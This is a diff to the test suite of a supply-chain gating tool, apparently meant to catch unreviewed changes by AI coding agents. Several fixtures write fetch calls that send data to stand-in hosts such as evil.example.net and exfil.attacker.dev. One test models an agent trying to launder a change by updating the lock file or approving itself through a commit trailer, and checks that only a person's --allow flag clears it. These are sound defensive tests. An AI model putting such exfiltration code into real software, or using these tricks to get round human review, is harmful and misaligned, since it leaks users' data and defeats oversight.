@@ -527,6 +527,59 @@ test('supply-chain pack: unpinned execution and install policy are counted, pinn
   assert.equal(scan('policy', d).out, '0');
 });
 
+test('lock: the same tree writes the same bytes, ordinary edits do not drift, structure does', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-lock-'));
+  execFileSync('git', ['init', '-q'], { cwd: d });
+  mkdirSync(join(d, 'src/api'), { recursive: true }); mkdirSync(join(d, 'src/db')); mkdirSync(join(d, 'src/auth')); mkdirSync(join(d, 'src/app/billing'), { recursive: true }); mkdirSync(join(d, '.github/workflows'), { recursive: true }); mkdirSync(join(d, 'test'));
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', bin: { a: 'x.js' }, exports: { '.': './x.js' }, dependencies: { left: '1' } }));
+  writeFileSync(join(d, 'src/api/h.js'), "import { q } from '../db/q.js';\napp.get('/users', h);\nconst u = 'https://api.stripe.com/v1';\n// see https://in-a-comment.dev/x\n");
+  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 1;\n');
+  writeFileSync(join(d, 'src/auth/a.js'), 'export const a = 1;\n');
+  writeFileSync(join(d, 'src/app/billing/route.ts'), 'export const GET = 1;\n');
+  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
+  writeFileSync(join(d, 'test/h.test.js'), "fetch('https://only-in-a-test.dev/')\n");
+  const lockTool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
+  const write = () => execFileSync('node', [lockTool, 'write', d], { encoding: 'utf8' });
+  const drift = () => execFileSync('node', [lockTool, 'drift', d], { encoding: 'utf8' }).trim();
+  write(); const first = readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'); write();
+  assert.equal(readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'), first, 'no timestamp: deterministic bytes');
+  const items = JSON.parse(first).items;
+  for (const i of ['dep:left', 'entry:bin:a', 'entry:export:.', 'workflow:.github/workflows/ci.yml', 'module:src/api', 'edge:src/api>src/db', 'route:GET /users', 'route:/billing', 'host:api.stripe.com']) assert.ok(items.includes(i), i);
+  assert.ok(!items.some((i) => /in-a-comment|only-in-a-test/.test(i)), 'comments and tests add no hosts');
+  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2; // an ordinary edit\n');
+  assert.equal(drift(), '0');
+  writeFileSync(join(d, 'src/db/q.js'), "import { a } from '../auth/a.js';\nexport const q = fetch('https://evil.example.net/x?e=' + a);\n");
+  assert.equal(drift(), '1', 'the new edge; example.net is reserved and not a host');
+  writeFileSync(join(d, 'src/db/q.js'), "export const q = fetch('https://exfil.attacker.dev/x');\n");
+  assert.equal(drift(), '1', 'the new host');
+});
+
+test('lock: an agent cannot launder a change by updating the lock; a person can, with --allow; a trailer cannot', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-lockflow-'));
+  execFileSync('git', ['init', '-q'], { cwd: d }); execFileSync('git', ['config', 'user.email', 'a@b.c'], { cwd: d }); execFileSync('git', ['config', 'user.name', 'a'], { cwd: d });
+  mkdirSync(join(d, 'src'));
+  writeFileSync(join(d, 'src/a.js'), 'export const a = 1;\n');
+  const pkg = { name: 'x', dependencies: { left: '1.0.0' } };
+  writeFileSync(join(d, 'package.json'), JSON.stringify(pkg));
+  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
+  assert.ok(existsSync(join(d, 'promptwheel.lock.json')), 'init writes the lock');
+  commitAll(d, 'contract');
+  const relock = () => assert.equal(pw(d, ['lock']).code, 0);
+  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...pkg, dependencies: { ...pkg.dependencies, evil: '1.0.0' } }));
+  relock();
+  // the drift reads 0 (the lock was updated) and the dependency count is the only other signal; the mandate catches the lock edit
+  let r = pw(d, ['run', '--working', '--no-record', '--json']);
+  assert.equal(r.code, 1, r.out);
+  const rep = JSON.parse(r.out.slice(r.out.indexOf('{')));
+  assert.ok(rep.mandates.some((m) => m.name === 'lock-frozen'), 'the lock edit is the violation');
+  commitAll(d, 'add evil and relock\n\nPromptwheel-Allow: an agent approving itself');
+  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
+  assert.equal(r.code, 1, 'a trailer clears neither the mandate nor the guards');
+  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'reviewed: needed for X']);
+  assert.equal(r.code, 0, r.out);
+  assert.ok(JSON.parse(r.out).allowed.cleared.includes('mandate:lock-frozen'));
+});
+
 test('supply-chain pack: the three counters on fixtures (manifests; npm, pnpm, yarn classic and yarn berry locks)', () => {
   const d = mkdtempSync(join(tmpdir(), 'pw-sc-scan-'));
   mkdirSync(join(d, 'packages/a'), { recursive: true }); mkdirSync(join(d, 'node_modules/x'), { recursive: true }); mkdirSync(join(d, 'berry'));
@@ -550,7 +603,7 @@ test('supply-chain pack: the three counters on fixtures (manifests; npm, pnpm, y
   rmSync(d, { recursive: true, force: true });
 });
 
-test('init --preset supply-chain: three held counts, the mandates, the contract as an evaluatorPath, the pack copied once', () => {
+test('init --preset supply-chain: the held counts, the lock, the mandates, the contract as an evaluatorPath, the pack copied once', () => {
   const d = mkdtempSync(join(tmpdir(), 'pw-sc-init-'));
   const g = (a) => execFileSync('git', a, { cwd: d });
   g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
@@ -561,9 +614,9 @@ test('init --preset supply-chain: three held counts, the mandates, the contract 
   assert.equal((r.out.match(/installed packs\/supply-chain/g) || []).length, 1, 'one pack, announced once, however many metrics run it');
   assert.match(pw(d, ['init', '--list']).out, /supply-chain\s+gate: no new lifecycle scripts/);
   const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
-  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources', 'unpinned_execution', 'install_policy_gaps']);
-  assert.ok(cfg.metrics.every((m) => m.guard === true && m.gamingCheck === false && m.allowable === true && m.cmd.startsWith('node .promptwheel/packs/supply-chain/scan.mjs ')), JSON.stringify(cfg.metrics));
-  assert.deepEqual(cfg.mandates.map((m) => m.name), ['workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'hooks-frozen']);
+  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources', 'unpinned_execution', 'install_policy_gaps', 'lock_drift']);
+  assert.ok(cfg.metrics.every((m) => m.guard === true && m.gamingCheck === false && m.allowable === 'flag' && m.cmd.startsWith('node .promptwheel/packs/supply-chain/')), JSON.stringify(cfg.metrics));
+  assert.deepEqual(cfg.mandates.map((m) => m.name), ['workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'lock-frozen', 'hooks-frozen']);
   assert.ok(cfg.mandates.every((m) => Array.isArray(m.paths) && m.paths.length && m.reason));
   assert.deepEqual(cfg.evaluatorPaths, ['promptwheel.config.json', 'sawbuck.config.json'], 'the contract is an evaluatorPath, not a mandate: a person can still retire a rule in a change that only edits it');
   for (const f of ['scan.mjs', 'pack.json', 'README.md']) assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain', f)), f + ' copied in');
@@ -602,14 +655,16 @@ test('supply-chain gate: a lifecycle script, a dependency or a non-registry lock
   assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'dependency_entries').ok, false);
   r = run('--allow', 'needed for the CSV export (papaparse)');
   assert.equal(r.code, 0, r.out); assert.equal(r.rep.verdict, 'pass');
-  assert.deepEqual(r.rep.allowed, { reason: 'needed for the CSV export (papaparse)', cleared: ['dependency_entries'] });
+  assert.deepEqual(r.rep.allowed, { reason: 'needed for the CSV export (papaparse)', cleared: ['dependency_entries', 'lock_drift'] });
   assert.equal(metric(r.rep, 'dependency_entries').ok, true); assert.equal(metric(r.rep, 'dependency_entries').allowed, true);
   assert.equal(metric(r.rep, 'dependency_entries').allowable, undefined, 'cleared, so no longer flagged as awaiting a reason');
-  // the same reason as a commit trailer, in refs mode
-  commitAll(d, 'add papaparse\n\nPromptwheel-Allow: needed for the CSV export (papaparse)');
+  // an agent can write a commit trailer, so a trailer never clears these guards: only the --allow flag does
+  commitAll(d, 'add papaparse\n\nPromptwheel-Allow: an agent approving itself');
   const rr = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
-  assert.equal(rr.code, 0, rr.out);
-  assert.deepEqual(JSON.parse(rr.out).allowed.cleared, ['dependency_entries']);
+  assert.equal(rr.code, 1, rr.out);
+  assert.equal(JSON.parse(rr.out).allowed, undefined);
+  const rf = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'a person read it']);
+  assert.equal(rf.code, 0, rf.out);
   g(['reset', '-q', '--hard', 'HEAD~1']);
 
   // a non-registry lock source
